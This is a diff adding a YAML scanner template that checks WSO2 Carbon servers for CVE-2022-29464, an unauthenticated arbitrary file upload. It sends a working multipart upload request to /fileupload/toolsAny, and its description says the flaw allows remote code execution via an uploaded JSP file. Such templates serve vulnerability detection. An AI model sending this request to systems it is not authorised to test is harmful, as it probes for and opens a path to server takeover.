@@ -1,0 +1,23 @@
+name: WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464
+manual: true
+query: app="WSO2-Carbon-Server"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /fileupload/toolsAny
+      headers:
+        Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
+      body: "--4ef9f369a86bfaadf5ec3177278d49c0\r\nContent-Disposition: form-data;
+        name=\"1.txt\"; filename=\"1.txt\"\r\n\r\n123\r\n--4ef9f369a86bfaadf5ec3177278d49c0--"
+      follow_redirects: true
+    expression: response.status == 200 && "[0-9]+".bmatches(response.body)
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  description: CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意
+    JSP 文件在 WSO2 服务器上获得 RCE。
+  tags: getshell
